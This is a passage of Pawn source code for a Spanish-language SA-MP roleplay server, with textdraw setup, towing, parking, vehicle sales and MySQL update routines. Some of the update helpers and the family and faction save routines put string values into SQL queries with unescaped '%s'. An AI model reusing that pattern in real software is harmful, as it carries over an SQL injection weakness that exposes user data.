		Mensaje(playerid, 0x0097DFFF, "_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _");
		format(string, sizeof(string), " Total: %d$", precio);
		Mensaje(playerid, COLOR_BLANCO, string);
	}
	return 1;
}
CallBack::Remolcar(playerid)
{
    new idcarx = GetPlayerVehicleID(playerid);
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
		if(GetVehicleModel(idcarx) == 525)
		{
			new Float:pX, Float:pY, Float:pZ;
			GetPlayerPos(playerid, pX, pY, pZ);
			new Float:vX, Float:vY, Float:vZ;
			new Found=0;
			new vid=0;
			while((vid<MAX_VEHICLES)&&(!Found))
			{
				vid++;
				GetVehiclePos(vid, vX, vY, vZ);
				if ((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0)&&(floatabs(pZ-vZ)<7.0)&&(vid!=GetPlayerVehicleID(playerid)))
				{
					Found=1;
 					if(IsTrailerAttachedToVehicle(idcarx))
 					{
   						DetachTrailerFromVehicle(idcarx);
						GetVehiclePos(idcarx, gVps[idcarx][0], gVps[idcarx][1], gVps[idcarx][2]);
     				}
        			else
          			{
						AttachTrailerToVehicle(vid, idcarx);
						GetVehiclePos(idcarx, gVps[idcarx][0], gVps[idcarx][1], gVps[idcarx][2]);
					}
				}
			}
			if(!Found)
			{
				Mensaje(playerid, COLOR_ROJO, "No hay ningún vehículo cerca!");
			}
		} else Mensaje(playerid, COLOR_ROJO, "Necesitas una grua para remolcar!");
	} else Mensaje(playerid, COLOR_ROJO, "No estas conduciendo ningun vehículo!");
	return 1;
}
CallBack::DialogoEstado(playerid)
{
	new string[80], SituacionEs[14];
	switch(EstadoON[playerid])
	{
	    case 0: SituacionEs = "Habilitar";
	    case 1: SituacionEs = "Deshabilitar";
 	}
	format(string, sizeof(string), "Estado: %s\nAccion: %s", cuenta[playerid][pEstado], SituacionEs);
	ShowPlayerDialog(playerid, DIALOG_ESTADO, DIALOG_STYLE_LIST, "Estado", string, "Seleccionar", "Salir");
}

LoadPlayerText(playerid)
{
	//LoadPlayerText
	for(new i, t=sizeof(iPhoneDatos); i<t; i++)
	{
		iPhoneDatos[i][TDIphone] = CreatePlayerTextDraw(playerid, 425.0, 180.0 + (i * 10), iPhoneDatos[i][ipOpcion]);
		PlayerTextDrawBackgroundColor(playerid, iPhoneDatos[i][TDIphone], 255);
		PlayerTextDrawFont(playerid, iPhoneDatos[i][TDIphone], 2);
		PlayerTextDrawLetterSize(playerid, iPhoneDatos[i][TDIphone], 0.224998, 1.009999);	
		PlayerTextDrawUseBox(playerid, iPhoneDatos[i][TDIphone], true);
		PlayerTextDrawBoxColor(playerid, iPhoneDatos[i][TDIphone], 0x00000000);
		PlayerTextDrawTextSize(playerid, iPhoneDatos[i][TDIphone], 500.00, 10.00);
		PlayerTextDrawColor(playerid, iPhoneDatos[i][TDIphone], -1);
		PlayerTextDrawSetOutline(playerid, iPhoneDatos[i][TDIphone], 1);
		PlayerTextDrawSetProportional(playerid, iPhoneDatos[i][TDIphone], 1);
		PlayerTextDrawSetSelectable(playerid, iPhoneDatos[i][TDIphone], true);
	}

	iPhonewifi[playerid] = CreatePlayerTextDraw(playerid, 425.000000, 136.000000, "~g~~h~~h~WIFI               ~w~Movistar");
	PlayerTextDrawBackgroundColor(playerid, iPhonewifi[playerid], 255);
	PlayerTextDrawFont(playerid, iPhonewifi[playerid], 2);
	PlayerTextDrawLetterSize(playerid, iPhonewifi[playerid], 0.219999, 0.930000);
	PlayerTextDrawColor(playerid, iPhonewifi[playerid], -1);
	PlayerTextDrawSetOutline(playerid, iPhonewifi[playerid], 0);
	PlayerTextDrawSetProportional(playerid, iPhonewifi[playerid], 1);
	PlayerTextDrawSetShadow(playerid, iPhonewifi[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, iPhonewifi[playerid], 0);
	
	InfoText[playerid][0] = CreatePlayerTextDraw(playerid, 319.999938, 401.955749, "_");
    PlayerTextDrawLetterSize(playerid, InfoText[playerid][0], 0.241999, 1.280593);
    PlayerTextDrawAlignment(playerid, InfoText[playerid][0], 2);
    PlayerTextDrawColor(playerid, InfoText[playerid][0], -1);
    PlayerTextDrawSetShadow(playerid, InfoText[playerid][0], 0);
    PlayerTextDrawSetOutline(playerid, InfoText[playerid][0], 1);
    PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][0], 51);
    PlayerTextDrawFont(playerid, InfoText[playerid][0], 1);
    PlayerTextDrawSetProportional(playerid, InfoText[playerid][0], 1);
	
	InfoText[playerid][1] = CreatePlayerTextDraw(playerid, -21.000000, 432.000000, "     ~p~>~w~WWW.CenterIsland.COM     ~g~>~w~Nivel: 100 ~r~>~w~Experiencia: 100/100 ~y~>~w~Fecha: 30/07/2014    ~b~>~w~RolePlay "Version"");
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][0], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][1], 0.330000, 1.600000);
	PlayerTextDrawColor(playerid, InfoText[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][1], 1);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][1], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][1], 0x00000077);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][1], 645.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][1], 0);

	InfoText[playerid][2] = CreatePlayerTextDraw(playerid, -14.000000, 432.000000, "____");
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][2], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][2], 0.330000, -0.400000);
	PlayerTextDrawColor(playerid, InfoText[playerid][2], -5963521);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][2], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][2], -5963521);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][2], 645.000000, -1.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][2], 0);

	InfoText[playerid][3] = CreatePlayerTextDraw(playerid, 498.000000, 98.000000, "~b~$~w~00000000");
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][3], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][3], 3);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][3], 0.579999, 2.399999);
	PlayerTextDrawColor(playerid, InfoText[playerid][3], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][3], 1);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][3], 0);

	InfoText[playerid][4] = CreatePlayerTextDraw(playerid, 320.000000, 145.000000, "ZonaZero es una comunidad de SAMP RolePlay en la que encontrarás muchas opciones para divertirte.~n~");
	PlayerTextDrawAlignment(playerid, InfoText[playerid][4], 2);
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][4], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][4], 2);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][4], 0.219999, 2.000000);
	PlayerTextDrawColor(playerid, InfoText[playerid][4], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][4], 1);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][4], 1);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][4], 0);

	InfoText[playerid][5] = CreatePlayerTextDraw(playerid, 200.000000, 120.000000, "    Registrar Identidad~n~~n~~n~DNI: 25212193~n~~n~Edad: 100~n~~n~Sexo: Hombre~n~~n~Nacionalidad: Venezuela~n~~n~Utiliza: las flechas");
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][5], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][5], 1);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][5], 0.289999, 1.399999);
	PlayerTextDrawColor(playerid, InfoText[playerid][5], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][5], 0);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, InfoText[playerid][5], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][5], 85);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][5], 450.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][5], 0);

	InfoText[playerid][6] = CreatePlayerTextDraw(playerid, 190.000000, 130.000000, "~y~-");
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][6], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][6], 1);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][6], 10.000000, 1.000000);
	PlayerTextDrawColor(playerid, InfoText[playerid][6], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][6], 0);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid, InfoText[playerid][6], 1);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][6], 0);

	InfoText[playerid][7] = CreatePlayerTextDraw(playerid, 420.000000, 186.000000, "~y~<");
	PlayerTextDrawAlignment(playerid, InfoText[playerid][7], 2);
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][7], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][7], 1);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][7], 0.500000, 1.899999);
	PlayerTextDrawColor(playerid, InfoText[playerid][7], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][7], 0);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][7], 1);
	PlayerTextDrawSetShadow(playerid, InfoText[playerid][7], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][7], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][7], 0x00000000);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][7], 20.000000, 10.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][7], true);

	InfoText[playerid][8] = CreatePlayerTextDraw(playerid, 420.000000, 160.000000, "~y~>");
	PlayerTextDrawAlignment(playerid, InfoText[playerid][8], 2);
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][8], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][8], 1);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][8], 0.500000, 1.899999);
	PlayerTextDrawColor(playerid, InfoText[playerid][8], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][8], 0);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][8], 1);
	PlayerTextDrawSetShadow(playerid, InfoText[playerid][8], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][8], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][8], 0x00000000);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][8], 20.000000, 10.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][8], true);

	InfoText[playerid][9] = CreatePlayerTextDraw(playerid, 420.000000, 212.000000, "~y~>>>");
	PlayerTextDrawAlignment(playerid, InfoText[playerid][9], 2);
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][9], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][9], 1);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][9], 0.280000, 1.700000);
	PlayerTextDrawColor(playerid, InfoText[playerid][9], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][9], 0);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][9], 1);
	PlayerTextDrawSetShadow(playerid, InfoText[playerid][9], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][9], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][9], 0x00000000);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][9], 20.000000, 20.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][9], true);

	InfoText[playerid][10] = CreatePlayerTextDraw(playerid, 420.000000, 236.000000, "~g~~h~~h~Listo");
	PlayerTextDrawAlignment(playerid, InfoText[playerid][10], 2);
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][10], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][10], 1);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][10], 0.310000, 1.600000);
	PlayerTextDrawColor(playerid, InfoText[playerid][10], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][10], 1);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][10], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][10], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][10], 0x00000000);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][10], 20.000000, 25.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][10], true);
	
	InfoText[playerid][11] = CreatePlayerTextDraw(playerid, 513.000000, 333.000000, "~n~   ~y~~h~Marcha~w~: ~n~   ~y~~h~Estado~w~: ~n~   ~y~~h~Gasolina~w~: ~n~   ~y~~h~KM/H~w~: ~n~   ~y~~h~GPS~w~:~n~   Ayunta~n~");
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][11], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][11], 2);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][11], 0.249999, 1.099999);
	PlayerTextDrawColor(playerid, InfoText[playerid][11], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][11], 1);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][11], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][11], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][11], 85);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][11], 630.000000, 150.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][11], 0);
	
	InfoText[playerid][12] = CreatePlayerTextDraw(playerid, 30.000000, 250.000000, "");
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][12], 51);
	PlayerTextDrawFont(playerid, InfoText[playerid][12], 2);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][12], 0.250000, 1.100000);
	PlayerTextDrawColor(playerid, InfoText[playerid][12], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][12], 1);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][12], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][12], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][12], 68);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][12], 220.000000, 100.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][12], 0);
	
	InfoText[playerid][13] = CreatePlayerTextDraw(playerid, 396.000000, 164.000000, "");
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][13], 136);
	PlayerTextDrawFont(playerid, InfoText[playerid][13], 1);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][13], 0.430000, 2.000000);
	PlayerTextDrawColor(playerid, InfoText[playerid][13], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][13], 1);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][13], 1);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][13], 0);
	
	InfoText[playerid][14] = CreatePlayerTextDraw(playerid, 469.000000, 346.000000, "SIGUIENTE");
	PlayerTextDrawAlignment(playerid, InfoText[playerid][14], 2);
	PlayerTextDrawBackgroundColor(playerid, InfoText[playerid][14], 255);
	PlayerTextDrawFont(playerid, InfoText[playerid][14], 2);
	PlayerTextDrawLetterSize(playerid, InfoText[playerid][14], 0.309999, 1.700000);
	PlayerTextDrawColor(playerid, InfoText[playerid][14], -1);
	PlayerTextDrawSetOutline(playerid, InfoText[playerid][14], 1);
	PlayerTextDrawSetProportional(playerid, InfoText[playerid][14], 1);
	PlayerTextDrawUseBox(playerid, InfoText[playerid][14], 1);
	PlayerTextDrawBoxColor(playerid, InfoText[playerid][14], -8453974);
	PlayerTextDrawTextSize(playerid, InfoText[playerid][14], 15.000000, 73.000000);
	PlayerTextDrawSetSelectable(playerid, InfoText[playerid][14], true);
	return 1;
}
/******************************************************************************/
/********************************[- Stock's -]*********************************/
/******************************************************************************/
stock MySQL_UPDATE_INT(const database[], name[], fila[], value)
{
	new Consulta[256];
	mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "UPDATE %s SET %s=%d WHERE nombre='%e'", database, fila, value, name);
	mysql_query(servidor[mysqlControl], Consulta, false);
	return true;
}
stock temporizador(playerid, segundos)
{
	cuenta[playerid][temporiz] = segundos + gettime();
	PlayerTextDrawShow(playerid, InfoText[playerid][13]);
	return 1;
}
stock MySQL_UPDATE_STRING(const database[], const name[], const fila[], const value[])
{
	new Consulta[256];
	mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "UPDATE %s SET %s='%s' WHERE nombre='%e'", database, fila, value, name);
	mysql_query(servidor[mysqlControl], Consulta, false);
	return true;
}
stock MySQL_UPDATE_FLOAT(const database[], name[], fila[], Float:value)
{
	new Consulta[256];
	mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "UPDATE %s SET %s=%f WHERE nombre='%e'", database, fila, value, name);
	mysql_query(servidor[mysqlControl], Consulta, false);
	return true;
}
stock PosicionVehicular(player, carid){
	if(obtenerDinero(player) > 1200){
		static Float:posold[3];
		GetVehiclePos(carid, posold[0], posold[1], posold[2]);
		SetPlayerCheckpoint(player, posold[0], posold[1], posold[2], 2); 
		pierdeDinero(player, 1200);
	}else Mensaje(player, COLOR_ROJO, "Error: usted no tiene esa cantidad de dinero.");
	return 1;
}
stock CleanScreen(){
    for(new i=0, t=GetMaxPlayers();i<t;i++){
        ClearChatbox(i, 100);
    }
    return 1;
}
stock EstacionarAuto(playerid, idcar)
{
	new carstats[4], Float:carheal;
	GetVehicleDamageStatus(idcar, carstats[0], carstats[1], carstats[2], carstats[3]);
	GetVehicleHealth(idcar, carheal);
	
	GetVehiclePos(idcar, gVps[idcar][0], gVps[idcar][1], gVps[idcar][2]);
	GetVehiclePos(idcar, autos[idcar][cLocationx], autos[idcar][cLocationy], autos[idcar][cLocationz]);
	GetVehicleZAngle(idcar, autos[idcar][cAngle]);
	DestroyVehicle(idcar);
	idcar = CreateVehicleEx(autos[idcar][cModel], autos[idcar][cLocationx], autos[idcar][cLocationy], autos[idcar][cLocationz]+1.0, autos[idcar][cAngle], autos[idcar][cColorOne], autos[idcar][cColorTwo], VEHICULO_SPAWN);
	
	new engine, lights, alarm, doors, bonnet, boot, objective;
	GetVehicleParamsEx(idcar, engine, lights, alarm, doors, bonnet, boot, objective);
	SetVehicleParamsEx(idcar, engine, cLuces[idcar], alarm, autos[idcar][cLock], bonnet, boot, objective);
	
	UpdateVehicleDamageStatus(idcar, carstats[0], carstats[1], carstats[2], carstats[3]);
	SetVehicleHealth(idcar, carheal);
	
	Mensaje(playerid, COLOR_AZUL_CLARO, "»{FFFFFF} Nuevas coordenadas guardadas. Tu vehículo aparecerá aquí.");
	ActualizaVehiculo(idcar);
	return 1;
}
stock MostrarNegocioInfos(playerid){
	Mensaje(playerid, COLOR_GRIS2, "0  - 19: AmmoNation | 20 Conse aereo | 21 - 40: Tienda 24/7 | 499: Discoteca Alhambra | 498: Clup VIP");
	Mensaje(playerid, COLOR_GRIS2, "497: 10 Green Bottles | 496 - 492: Binco | 491 - 487: Tienda Victim | 486 - 482: BurguerShot");
	Mensaje(playerid, COLOR_GRIS2, "481: Conse grotty | 480: conse medio | 479: conse moto | 478: Electronicos SOCIP | 477 - 473: Chukin Bell");
	Mensaje(playerid, COLOR_GRIS2, "472: Gymnacio | 471: Casino 4 Dragones | 470: cafe el dorado | 469 - 465: Pizza Stack | 464: Paintball");
	return 1;
}
stock ObtenerTiempoRestante(tiempo)
{
	new str[32];
	new tiempo2 = gettime();
	new tmp = (tiempo - tiempo2);
	
	if(tmp > 0 && tmp <= 60)
	{
		format(str, sizeof(str), "%d segundos", tmp);
	}
	else if(tmp > 60 && tmp <= 3600)
	{
		format(str, sizeof(str), "%d minutos", tmp / 60);
	}
	else if(tmp > 3600 && tmp <= 86400)
	{
		format(str, sizeof(str), "%d horas", (tmp / 60) / 60);
	}
	else if(tmp > 86400 && tmp <= 2592000)
	{
		format(str, sizeof(str), "%d dias", ((tmp / 60) / 60) / 24);
	}
	else if(tmp > 2592000 && tmp <= 31104000)
	{
		format(str, sizeof(str), "%d meses", (((tmp / 60) / 60) / 24) / 30);
	}
	else if(tmp > 31104000)
	{
		format(str, sizeof(str), "%d años", tmp/60/60/24/30/12);
	}
	else
	{
		str = "Empezar a preocuparse";
	}
	return str;
}
stock LlaveVehicular(playerid, carid){
	if(cuenta[playerid][cCoche] == carid) return true;
	else if(cuenta[playerid][cCoche2] == carid) return true; 
	else if(cuenta[playerid][cCoche3] == carid) return true; 
	else if(cuenta[playerid][cCoche4] == carid) return true;
	else return false;
}
stock ComprarUsuarioVehiculo(playerid)
{
	Mensaje(playerid, COLOR_BLANCO, "Felicidades! Tienes nuevo vehículo, utiliza /papeles");
	Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, "Has vendido tu vehículo!");

	RemovePlayerFromVehicle(peticionIDofertante[playerid]);
	pierdeDinero(playerid, peticionPrecio[playerid]);
	ganaDinero(peticionIDofertante[playerid], peticionPrecio[playerid]);

	format(autos[peticionIDItem[playerid]][cOwner], 24, "%s", Nombre(playerid));
	ActualizaVehiculo(peticionIDItem[playerid]);
	
	if(peticionSlotItem[playerid] == 1)
	{
		cuenta[peticionIDofertante[playerid]][cCoche] = 0;
	}
	else if(peticionSlotItem[playerid] == 2)
	{
		cuenta[peticionIDofertante[playerid]][cCoche2] = 0;
	}
	else if(peticionSlotItem[playerid] == 3)
	{
		cuenta[peticionIDofertante[playerid]][cCoche3] = 0;
	}
	else if(peticionSlotItem[playerid] == 4)
	{
		cuenta[peticionIDofertante[playerid]][cCoche4] = 0;
	}
	
	peticionSlotItem[playerid] = 0;
	booleano[Facturing]{playerid} = false;
	peticiones[playerid] = 0;
	peticionIDofertante[playerid] = 999;
	peticionIDItem[playerid] = 999;
	peticionPrecio[playerid] = 0;
	return 1;
}
CallBack::ConsultarCuenta(playerid)
{
	new	tmp[124], tmp2[24];
	mysql_real_escape_string(Nombre(playerid), tmp2, servidor[mysqlControl]);
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "SELECT nombre, inv11, nivel FROM zz_usuarios WHERE nombre='%e' LIMIT 1;", tmp2);
	mysql_tquery(servidor[mysqlControl], tmp, "ConfirmarCuenta", "i", playerid);
	return 1;
}
CallBack::ConfirmarCuenta(playerid)
{
	if(cache_get_row_count())
	{
		ShowLoginDialog(playerid, DIALOGO_INGRESO);
	}
	else
	{
		ShowRegisterDialog(playerid, DIALOGO_REGISTRO);
	}
	return 1;
}
CallBack::ActualizarBolsa(playerid)
{
	new consulta[1024];
	format(consulta, sizeof(consulta), "UPDATE zz_bolsa SET empresa0=%d, empresa1=%d, empresa2=%d, empresa3=%d, empresa4=%d, empresa5=%d, empresa6=%d, empresa7=%d, cantidad0=%d, cantidad1=%d, cantidad2=%d, cantidad3=%d, cantidad4=%d, cantidad5=%d, cantidad6=%d, cantidad7=%d WHERE unico='%d'", 
	acciones[playerid][aAccTipo][0], 
	acciones[playerid][aAccTipo][1], 
	acciones[playerid][aAccTipo][2], 
	acciones[playerid][aAccTipo][3], 
	acciones[playerid][aAccTipo][4], 
	acciones[playerid][aAccTipo][5], 
	acciones[playerid][aAccTipo][6], 
	acciones[playerid][aAccTipo][7], 
	acciones[playerid][aAccCantidad][0], 
	acciones[playerid][aAccCantidad][1], 
	acciones[playerid][aAccCantidad][2], 
	acciones[playerid][aAccCantidad][3], 
	acciones[playerid][aAccCantidad][4], 
	acciones[playerid][aAccCantidad][5], 
	acciones[playerid][aAccCantidad][6], 
	acciones[playerid][aAccCantidad][7], 
	cuenta[playerid][cUnico]);
	mysql_query(servidor[mysqlControl], consulta, false);
	return 1;
}
CallBack::ActualizarFamilia(famid)
{
	new consulta[1024];
	format(consulta, sizeof(consulta), "UPDATE zz_familias SET focupado=%d, fnombre='%s', frango1='%s', frango2='%s', frango3='%s', frango4='%s', frango5='%s', frango6='%s', fposx=%f, fposy=%f, fposz=%f WHERE fslot=%d;", 
	familias[famid][fOcupado], 
	familias[famid][fNombre], 
	familias[famid][fRango0], 
	familias[famid][fRango1], 
	familias[famid][fRango2], 
	familias[famid][fRango3], 
	familias[famid][fRango4], 
	familias[famid][fRango5], 
	familias[famid][fpospick][0], 
	familias[famid][fpospick][1], 
	familias[famid][fpospick][2], 
	famid);
	mysql_query(servidor[mysqlControl], consulta, false);
	return 1;
}
CallBack::ActualizarFaccion(Ifaccid)
{
	new consulta[1128];
	format(consulta, sizeof(consulta), "UPDATE zz_ilegalfacciones SET ifuso=%d, ifnombre='%s', ifrango0='%s', ifrango1='%s', ifrango2='%s', ifrango3='%s', ifrango4='%s', ifrango5='%s', ifbobeda=%d, ifarma0=%d, ifarma1=%d, ifarma2=%d, ifarma3=%d, ifarma4=%d, ifarma5=%d, ifarma6=%d, ifarma7=%d, ifarma8=%d, ifarma9=%d, ifarma10=%d, ifarma11=%d, ifarma12=%d, ifarma13=%d, ifarma14=%d, ifarma15=%d, ifarma16=%d, ifarma17=%d, ifarma18=%d, ifarma19=%d, ifdroga0=%d, ifdroga1=%d, ifdroga2=%d, ifdroga3=%d, ifdroga4=%d, ifdroga5=%d, ifdroga6=%d, ifdroga7=%d, ifdroga8=%d, ifdroga9=%d, ifdroga10=%d, ifdroga11=%d, ifdroga12=%d, ifdroga13=%d, ifdroga14=%d, ifdroga15=%d, ifdroga16=%d, ifdroga17=%d, ifdroga18=%d, ifdroga19=%d, ifposx=%f, ifposy=%f, ifposz=%f, ifbposx=%f, ifbposy=%f, ifbposz=%f, ifcolor=%d WHERE ifid=%d;", 
	IFacciones[Ifaccid][If@usada], 
	IFacciones[Ifaccid][If@nombre], 
	IFacciones[Ifaccid][If@rango0], 
	IFacciones[Ifaccid][If@rango1], 
	IFacciones[Ifaccid][If@rango2], 
	IFacciones[Ifaccid][If@rango3], 
	IFacciones[Ifaccid][If@rango4], 
	IFacciones[Ifaccid][If@rango5], 
	IFacciones[Ifaccid][If@boveda], 
	IFacciones[Ifaccid][If@armas][0], 
	IFacciones[Ifaccid][If@armas][1], 
	IFacciones[Ifaccid][If@armas][2], 
	IFacciones[Ifaccid][If@armas][3], 
	IFacciones[Ifaccid][If@armas][4], 
	IFacciones[Ifaccid][If@armas][5], 
	IFacciones[Ifaccid][If@armas][6], 
	IFacciones[Ifaccid][If@armas][7], 
	IFacciones[Ifaccid][If@armas][8], 
	IFacciones[Ifaccid][If@armas][9], 
	IFacciones[Ifaccid][If@armas][10], 
	IFacciones[Ifaccid][If@armas][11], 
	IFacciones[Ifaccid][If@armas][12], 
	IFacciones[Ifaccid][If@armas][13], 
	IFacciones[Ifaccid][If@armas][14], 
	IFacciones[Ifaccid][If@armas][15], 
	IFacciones[Ifaccid][If@armas][16], 
	IFacciones[Ifaccid][If@armas][17], 
	IFacciones[Ifaccid][If@armas][18], 
	IFacciones[Ifaccid][If@armas][19], 
	IFacciones[Ifaccid][If@drogas][0], 
	IFacciones[Ifaccid][If@drogas][1], 
	IFacciones[Ifaccid][If@drogas][2], 
	IFacciones[Ifaccid][If@drogas][3], 
	IFacciones[Ifaccid][If@drogas][4], 
	IFacciones[Ifaccid][If@drogas][5], 
	IFacciones[Ifaccid][If@drogas][6], 
	IFacciones[Ifaccid][If@drogas][7], 
	IFacciones[Ifaccid][If@drogas][8], 
	IFacciones[Ifaccid][If@drogas][9], 
	IFacciones[Ifaccid][If@drogas][10], 
	IFacciones[Ifaccid][If@drogas][11], 
	IFacciones[Ifaccid][If@drogas][12], 
	IFacciones[Ifaccid][If@drogas][13], 
	IFacciones[Ifaccid][If@drogas][14], 
	IFacciones[Ifaccid][If@drogas][15], 
	IFacciones[Ifaccid][If@drogas][16], 
	IFacciones[Ifaccid][If@drogas][17], 
	IFacciones[Ifaccid][If@drogas][18], 
	IFacciones[Ifaccid][If@drogas][19], 
	IFacciones[Ifaccid][If@pos][0], 
	IFacciones[Ifaccid][If@pos][1], 
	IFacciones[Ifaccid][If@pos][2], 
	IFacciones[Ifaccid][If@bpos][0], 
	IFacciones[Ifaccid][If@bpos][1], 
	IFacciones[Ifaccid][If@bpos][2], 
	IFacciones[Ifaccid][If@color], 
	Ifaccid);
	mysql_query(servidor[mysqlControl], consulta, false);
	return 1;
}
CallBack::ActualizarMaletas(i)
{
    new consulta[1024];
	format(consulta, sizeof(consulta), "UPDATE zz_maletas SET arma1=%d, arma2=%d, arma3=%d, arma4=%d, arma5=%d, arma6=%d, arma7=%d, arma8=%d, chaleco=%d, droga1=%d, droga2=%d, droga3=%d, droga4=%d, droga5=%d WHERE vehicleid=%d", 
	maletero[i][marma][0], 
	maletero[i][marma][1], 
	maletero[i][marma][2], 
	maletero[i][marma][3], 
	maletero[i][marma][4], 
	maletero[i][marma][5], 
	maletero[i][marma][6], 
	maletero[i][marma][7], 
	maletero[i][mchaleco], 
	maletero[i][mdrogas][0], 
	maletero[i][mdrogas][1], 
	maletero[i][mdrogas][2], 
	maletero[i][mdrogas][3], 
